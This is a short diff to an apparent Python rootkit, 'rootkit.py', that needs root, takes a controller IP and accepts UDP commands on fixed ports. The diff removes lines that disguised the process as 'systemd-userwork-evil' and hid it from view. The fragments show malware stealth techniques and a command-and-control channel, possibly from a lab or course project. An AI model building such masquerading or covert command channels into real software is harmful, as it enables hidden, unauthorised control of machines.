@@ -37,7 +37,6 @@ if os.geteuid() != 0:
     print("ERROR: Root privileges are required to run this program!", file=sys.stderr)
     exit(1)
 
-set_proc_name(b"systemd-userwork-evil")
 
 PARSER = argparse.ArgumentParser("./rootkit.py")
 PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host.")
@@ -602,7 +601,6 @@ def packet_handler(pkt):
         -------
         None
     """
-    hide_process_name("systemd-userwork-evil")
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
         return
     command = receive_udp_command(pkt)
